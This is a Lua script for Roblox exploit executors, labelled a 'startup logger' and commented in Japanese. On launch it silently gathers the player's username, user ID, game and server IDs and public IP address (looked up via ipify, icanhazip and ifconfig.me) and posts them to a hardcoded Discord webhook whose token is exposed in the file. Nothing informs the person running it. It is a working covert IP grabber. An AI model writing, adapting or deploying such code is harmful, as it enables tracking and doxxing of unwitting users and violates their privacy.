--[[
    Discord Startup Logger v2.1 (Debug)
    ・アバターURLを https:// 形式で強制取得
    ・各ステップでprintログ
    ・request系失敗時のフォールバック
]]

local WEBHOOK_URL = "https://discord.com/api/webhooks/1551183993678991502/CS2wbN6nhsxWx6DaF0kYKLJKSJ_3otBABFO0kk-dmMpaktJv4-CJW7Hl60MpCofPvgQB"
local WEBHOOK_NAME = "user"
local MESSAGE = "スクリプト起動ログ"
local EMBED_COLOR = 0x64FF96
local FETCH_IP = true

if WEBHOOK_URL == "" then
    warn("[Logger] Webhook URL未設定")
    return
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- ==========================================
-- request関数取得
-- ==========================================
local function getRequestFunc()
    return request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
end

print("[Logger] request関数:", getRequestFunc() and "OK" or "なし")

-- ==========================================
-- アバターURL取得（https:// を強制）
-- ==========================================
local function getAvatarUrl(userId)
    local req = getRequestFunc()

    -- 方法1: thumbnails.roblox.com API（https URLが返る）
    if req then
        local url = string.format(
            "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false",
            userId
        )
        local ok, res = pcall(function()
            return req({ Url = url, Method = "GET" })
        end)
        print("[Logger] thumbnails API:", ok and "成功" or "失敗", ok and (res and res.StatusCode) or res)

        if ok and res and res.Body then
            local ok2, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
            if ok2 and decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
                print("[Logger] avatar URL:", decoded.data[1].imageUrl)
                return decoded.data[1].imageUrl
            end
        end
    end

    -- 方法2: GetUserThumbnailAsync（rbxthumb:// が返る可能性あり）
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(
            userId,
            Enum.ThumbnailType.HeadShot,
            Enum.ThumbnailSize.Size420x420
        )
    end)
    print("[Logger] GetUserThumbnailAsync:", ok and url or "失敗")

    if ok and url then
        -- rbxthumb://type=AvatarHeadShot&id=123&w=420&h=420 → APIでhttps化
        local id = url:match("id=(%d+)")
        if id and req then
            local apiUrl = string.format(
                "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%s&size=420x420&format=Png&isCircular=false",
                id
            )
            local ok3, res3 = pcall(function()
                return req({ Url = apiUrl, Method = "GET" })
            end)
            if ok3 and res3 and res3.Body then
                local ok4, decoded4 = pcall(function() return HttpService:JSONDecode(res3.Body) end)
                if ok4 and decoded4 and decoded4.data and decoded4.data[1] then
                    return decoded4.data[1].imageUrl
                end
            end
        end
        -- https でなければ無効
        if url:match("^https://") then return url end
    end

    return nil
end

-- ==========================================
-- IP取得
-- ==========================================
local function getIP()
    if not FETCH_IP then return "取得無効" end
    local req = getRequestFunc()
    if not req then return "request関数なし" end

    local services = {
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://ifconfig.me/ip"
    }
    for _, url in ipairs(services) do
        local ok, res = pcall(function()
            return req({ Url = url, Method = "GET" })
        end)
        if ok and res and res.Body then
            local ip = tostring(res.Body):gsub("%s+", "")
            if ip:match("^%d+%.%d+%.%d+%.%d+$") then
                print("[Logger] IP:", ip)
                return ip
            end
        end
    end
    print("[Logger] IP取得失敗")
    return "取得失敗"
end

-- ==========================================
-- 送信
-- ==========================================
local function sendToWebhook(payload)
    local req = getRequestFunc()
    local body = HttpService:JSONEncode(payload)

    if req then
        local ok, res = pcall(function()
            return req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body
            })
        end)
        if ok and res then
            print("[Logger] 送信 status:", res.StatusCode, res.Body)
            return true
        else
            warn("[Logger] request失敗:", res)
        end
    end

    -- フォールバック
    local ok2, err = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, body)
    end)
    print("[Logger] PostAsync:", ok2 and "成功" or ("失敗: " .. tostring(err)))
    return ok2
end

-- ==========================================
-- 起動ログ送信
-- ==========================================
local function sendStartupLog()
    local userId = LP.UserId
    local displayName = LP.DisplayName
    local playerName = LP.Name
    local placeId = game.PlaceId
    local gameName = game.Name or "Unknown"
    local jobId = game.JobId ~= "" and game.JobId or "N/A"
    local time = os.date("%Y-%m-%d %H:%M:%S")

    print("[Logger] ユーザー:", playerName, "ゲーム:", gameName)

    local ip = getIP()
    local avatarUrl = getAvatarUrl(userId)

    local embed = {
        title = "起動ログ",
        color = EMBED_COLOR,
        fields = {
            { name = "ユーザー名", value = displayName .. " (@" .. playerName .. ")", inline = true },
            { name = "ユーザーID", value = tostring(userId), inline = true },
            { name = "ゲーム名", value = gameName, inline = false },
            { name = "ゲームID", value = tostring(placeId), inline = true },
            { name = "Job ID", value = jobId, inline = false },
            { name = "IPアドレス", value = ip, inline = true },
            { name = "起動時刻", value = time, inline = true },
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
        footer = { text = "Startup Logger v2.1" }
    }

    if MESSAGE ~= "" then embed.description = MESSAGE end
    if avatarUrl then embed.thumbnail = { url = avatarUrl } end

    local payload = {
        username = WEBHOOK_NAME,
        embeds = { embed }
    }

    sendToWebhook(payload)
end

task.spawn(function()
    pcall(sendStartupLog)
end)
